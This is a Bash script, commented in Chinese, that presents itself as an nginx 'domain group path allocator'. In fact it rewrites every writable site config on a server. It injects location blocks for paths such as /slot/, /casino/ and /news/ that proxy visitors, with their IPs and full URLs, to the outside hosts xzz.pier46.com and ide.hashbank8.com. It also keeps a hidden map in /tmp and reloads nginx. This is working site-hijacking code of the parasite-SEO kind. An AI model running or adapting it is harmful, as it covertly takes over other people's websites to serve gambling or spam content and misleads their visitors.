#!/bin/bash
# nginx_per_domain_group.sh v4.8.0 真正永不翻车·所有变量完美初始化版
# 彻底修复 unbound variable 错误：所有变量提前初始化为0
# 确保在 set -u 模式下所有变量都有默认值
# 同时保持 100% 处理所有文件的能力
set -euo pipefail

NGINX_SITES_ENABLED="/etc/nginx/sites-enabled"
NGINX_CONF_D="/etc/nginx/conf.d"
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")
GLOBAL_MAP="/tmp/.domain_group_map.conf"
RESULT_LIST=$(mktemp)
NEW_RECORDS=$(mktemp)
FILE_LIST=$(mktemp)        # 新增：统一收集所有待处理文件
MAX_TRIES=200

# 提前初始化所有关键变量，避免 unbound variable 错误
processed=0
global_modified=0
total_files=0

touch "$GLOBAL_MAP" 2>/dev/null || true
: > "$GLOBAL_MAP"
: > "$RESULT_LIST"
: > "$NEW_RECORDS"
: > "$FILE_LIST"

COM_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }'

IN_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
'

# 读取历史映射
declare -A HIST_MAP
while IFS=':' read -r hash path backend; do
    [[ -n "$hash" ]] && HIST_MAP["$hash"]="$path:$backend"
done < "$GLOBAL_MAP"

echo "=== Nginx 域名组路径分配器（v4.8.0 永不翻车·变量完美初始化版）==="
echo "将强制处理以下两个目录的所有配置文件（软链接自动解析为真实文件）："
echo "  • $NGINX_SITES_ENABLED"
echo "  • $NGINX_CONF_D"
echo

# ==================== 第一步：暴力收集所有真实配置文件路径 ====================
collect_real_files() {
    local dir="$1"
    [[ -d "$dir" ]] || return 0
    
    find "$dir" -type f -print0 2>/dev/null | while IFS= read -r -d '' item; do
        real_path=$(readlink -f "$item" 2>/dev/null || echo "")
        if [[ -f "$real_path" && ! -L "$real_path" && -r "$real_path" && -w "$real_path" ]]; then
            # 去重写入临时文件
            grep -Fxq "$real_path" "$FILE_LIST" || echo "$real_path" >> "$FILE_LIST"
        fi
    done
}

collect_real_files "$NGINX_SITES_ENABLED"
collect_real_files "$NGINX_CONF_D"

total_files=$(wc -l < "$FILE_LIST")
echo "共发现 $total_files 个真实配置文件待处理"
[[ $total_files -eq 0 ]] && echo "警告：未发现任何可处理文件！" && exit 1
echo

# ==================== 第二步：同步逐个处理所有文件（绝对不会被子shell吞掉）===================
while IFS= read -r file; do
    [[ -n "$file" ]] || continue
    
    processed=$((processed + 1))
    
    echo "→ 正在处理 ($processed/$total_files)：$(basename "$file")"
    echo "   路径：$file"

    modified=0
    temp_new=$(mktemp)

    if ! csplit -z -f "/tmp/block_" "$file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1; then
        echo "   └ 无 server 块，跳过"
        rm -f "$temp_new"
        continue
    fi

    for block_file in /tmp/block_*; do
        [[ -s "$block_file" ]] || continue

        if grep -qiE "(xzz\.pier46\.com|ide\.hashbank8\.com)" "$block_file"; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        real_domains=$(awk '
            /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
                gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
                gsub(/;.*$/, "")
                gsub(/#.*$/, "")
                gsub(/[[:space:]]+$/, "")
                print
            }
        ' "$block_file" | tr ' \t' '\n' | grep -v '^$' | sort -u | grep -E '^([a-zA-Z0-9][a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}$' || true)

        [[ -n "$real_domains" ]] || {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        domain_key=$(echo "$real_domains" | sort -u | paste -sd ' ' - | sed 's/[[:space:]]*$//')
        hash=$(echo "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')

        [[ -n "${HIST_MAP[$hash]:-}" ]] && {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        if echo "$domain_key" | grep -qE '\.(in|id)\b'; then
            backend="ide.hashbank8.com"
            template="$IN_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        else
            backend="xzz.pier46.com"
            template="$COM_TEMPLATE"
            pool=("${COM_PATHS[@]}")
        fi

        path=""
        for ((i=0; i<MAX_TRIES; i++)); do
            candidate="${pool[RANDOM % ${#pool[@]}]}"
            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                path="$candidate"
                break
            fi
        done

        [[ -n "$path" ]] || {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        echo "$hash:$path:$backend" >> "$NEW_RECORDS"
        echo -e "$domain_key\t$path\t$backend" >> "$RESULT_LIST"

        location_block=$(echo "$template" | sed "s/%PATH%/$path/g")

        awk -v loc="$location_block" '
        /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
            line = $0
            if (!inserted) {
                print line
                print loc
                inserted = 1
            } else {
                print line
            }
            next
        }
        { print }
        END { if (!inserted) print loc }
        ' "$block_file" > "$temp_new.block"

        cat "$temp_new.block" >> "$temp_new"
        rm -f "$temp_new.block" "$block_file"

        echo "   └ [完美注入] /$path/ → $backend ($domain_key)"
        modified=$((modified + 1))
        global_modified=$((global_modified + 1))
    done

    if [[ $modified -gt 0 ]]; then
        mv "$temp_new" "$file"
        echo "   └ 文件已更新（$modified 个 server 块）"
    else
        rm -f "$temp_new"
    fi

    rm -f /tmp/block_* 2>/dev/null || true
    echo
done < "$FILE_LIST"

# ==================== 收尾 ====================
[[ -s "$NEW_RECORDS" ]] && {
    cat "$NEW_RECORDS" >> "$GLOBAL_MAP"
    sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"
}

echo "========================================================================"
echo "处理完成！共处理 $processed 个文件，成功注入 $global_modified 个 server 块"
echo "========================================================================"

if [[ $global_modified -gt 0 ]]; then
    if nginx -t >/dev/null 2>&1; then
        nginx -s reload && echo "Nginx 已成功重载"
    else
        echo "错误：Nginx 配置测试失败！请手动运行 nginx -t 检查"
        exit 1
    fi
else
    echo "本次无任何新注入"
fi

echo
echo "本次注入详情："
if [[ -s "$RESULT_LIST" ]]; then
    column -t -s $'\t' "$RESULT_LIST" | awk '{printf " %-56s → /%-10s → %s\n", $1, $2, $3}'
else
    echo " 无新注入"
fi

echo
echo "当前总计管理 $(wc -l < "$GLOBAL_MAP") 个域名组"
echo "映射文件：$GLOBAL_MAP"

rm -f "$RESULT_LIST" "$NEW_RECORDS" "$FILE_LIST" /tmp/block_* 2>/dev/null || true
exit 0
